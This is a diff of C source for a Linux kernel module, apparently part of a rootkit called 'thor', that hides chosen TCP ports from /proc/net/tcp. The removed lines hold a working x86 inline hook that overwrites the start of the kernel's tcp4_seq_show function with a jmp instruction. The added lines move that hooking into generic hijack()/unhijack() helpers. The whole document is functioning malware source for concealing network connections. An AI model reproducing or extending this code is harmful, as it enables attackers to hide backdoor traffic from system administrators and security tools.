@@ -1,9 +1,10 @@
-#include "helper.h"
-#include "sockethider.h"
-
 #include <linux/slab.h>
 #include <linux/version.h>
 #include <net/tcp.h>
+
+#include "helper.h"
+#include "hijack.h"
+#include "sockethider.h"
 
 struct _tcp4_list {
     int port;
@@ -15,13 +16,6 @@ static struct _tcp4_list tcp4_list;
 
 /* original tcp4_seq_show which we need to hijack */
 static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
-#if CONFIG_X86
-/* store the first instruction(s) of tcp4_seq_show */
-/* we overwrite it with an instruction of lenght 5 Byte */
-char tcp4_seq_show_firstinstr[5];
-#else
-#error architecture not yet supported
-#endif
 
 /* defines */
 #define TMPSZ 150
@@ -51,41 +45,6 @@ static void *get_tcp_seq_show(const char *path)
     return ret;
 }
 
-static void hijack_tcp4_seq_show(void)
-{
-#if CONFIG_X86
-    int32_t jmp;
-
-    /* store the first 5 bytes of tcp4_seq_show, as we overwrite it with a
-     * jmp instruction, which is of length 5 byte */
-    memcpy(&tcp4_seq_show_firstinstr, tcp4_seq_show, 5);
-
-    jmp = (int32_t)(thor_tcp4_seq_show - tcp4_seq_show);
-
-    set_addr_rw(tcp4_seq_show);
-
-    /* x86 rjmp */
-    ((char*)tcp4_seq_show)[0] = 0xE9;
-
-    /* store jump address as little endian */
-    ((char*)tcp4_seq_show)[1] = (jmp & 0xFF);
-    ((char*)tcp4_seq_show)[2] = (jmp & 0xFF00) >> 8;
-    ((char*)tcp4_seq_show)[3] = (jmp & 0xFF0000) >> 16;
-    ((char*)tcp4_seq_show)[4] = jmp >> 24;
-
-    set_addr_ro(tcp4_seq_show);
-#endif
-}
-
-static void unhijack_tcp4_seq_show(void)
-{
-#if CONFIG_X86
-    set_addr_rw(tcp4_seq_show);
-    memcpy(tcp4_seq_show, tcp4_seq_show_firstinstr, 5);
-    set_addr_ro(tcp4_seq_show);
-#endif
-}
-
 static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
 {
     int ret;
@@ -95,9 +54,9 @@ static int thor_tcp4_seq_show(struct seq_file *seq, void *v)
     /* TODO: this leaves the tcp4_seq_show function unhijacked for a few
      * cycles, ideally we would execute the content of tcp4_seq_show_firstinstr
      * and jump to the second instruction of the original tcp4_seq_show */
-    unhijack_tcp4_seq_show();
+    unhijack(tcp4_seq_show);
     ret = tcp4_seq_show(seq, v);
-    hijack_tcp4_seq_show();
+    hijack(tcp4_seq_show, thor_tcp4_seq_show);
 
     /* hide port */
     list_for_each_entry(tmp, &(tcp4_list.list), list) {
@@ -117,10 +76,10 @@ int sockethider_init(void)
 {
     tcp4_seq_show = get_tcp_seq_show("/proc/net/tcp");
     if(tcp4_seq_show == NULL) return -1;
-
-    hijack_tcp4_seq_show();
     
     INIT_LIST_HEAD(&tcp4_list.list);
+
+    hijack(tcp4_seq_show, thor_tcp4_seq_show);
 
     return 0;
 }
@@ -128,7 +87,7 @@ int sockethider_init(void)
 void sockethider_cleanup(void)
 {
     if(tcp4_seq_show != NULL) {
-        unhijack_tcp4_seq_show();
+        unhijack(tcp4_seq_show);
     }
 
     clear_tcp4_list();
